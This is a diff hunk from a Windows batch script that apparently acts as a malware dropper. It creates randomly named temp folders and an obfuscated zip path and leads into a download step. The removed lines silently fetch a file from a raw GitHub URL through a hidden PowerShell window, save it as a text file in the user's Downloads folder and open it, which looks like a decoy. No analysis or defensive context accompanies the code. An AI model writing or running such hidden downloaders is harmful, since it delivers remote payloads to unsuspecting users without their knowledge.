@@ -5,15 +5,6 @@ set "tempdir=%temp%"
 set "subdir=%tempdir%\MySubDir_%random%%random%"
 set "output=%tempdir%\4g5h790g2345h7890g2345h90g2345h-890v2345h789-3v5h.zip"
 
-set "urlpdf=https://github.com/vfafa/d/raw/refs/heads/a/1"
-set "downloadPath=%USERPROFILE%\Downloads\tut.txt"
-powershell -w hidden -c "Invoke-WebRequest -Uri '%urlpdf%' -OutFile '%downloadPath%' -UseBasicParsing -ErrorAction SilentlyContinue"
-if exist "%downloadPath%" (
-start "" "%downloadPath%"
-) else (
-start "" "%downloadPath%"
-)
-
 mkdir "%subdir%"
 
 :download
